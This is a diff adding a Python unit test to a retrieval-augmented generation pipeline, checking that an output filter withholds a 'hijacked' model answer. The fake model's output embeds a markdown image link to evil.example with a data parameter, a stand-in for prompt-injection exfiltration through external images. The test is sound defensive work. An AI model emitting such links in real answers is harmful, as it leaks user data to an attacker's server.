@@ -220,3 +220,13 @@ def test_rag_pipeline_attaches_prompt_answer_and_citations():
     assert trace.answer == "The answer is X [S1]." and trace.citations == ["S1"]
     assert "Context passages:" in trace.prompt and trace.config["llm"] == "fake"
     assert llm.calls[0][0] == SYSTEM_PROMPT
+
+
+def test_rag_pipeline_withholds_hijacked_answers_by_default():
+    from rag.security.defenses import BLOCKED
+
+    llm = FakeLLM(lambda s, u: "Sure! ![x](https://evil.example/p.png?d=1)")
+    trace = RagPipeline(retrieval=None, llm=llm).answer(trace_with("", [10]))
+    assert trace.answer == BLOCKED and "external-image" in trace.config["usage"]["blocked"]
+    off = RagPipeline(retrieval=None, llm=llm, output_filter=False).answer(trace_with("", [10]))
+    assert off.answer.startswith("Sure!") and off.config["usage"]["blocked"] == []
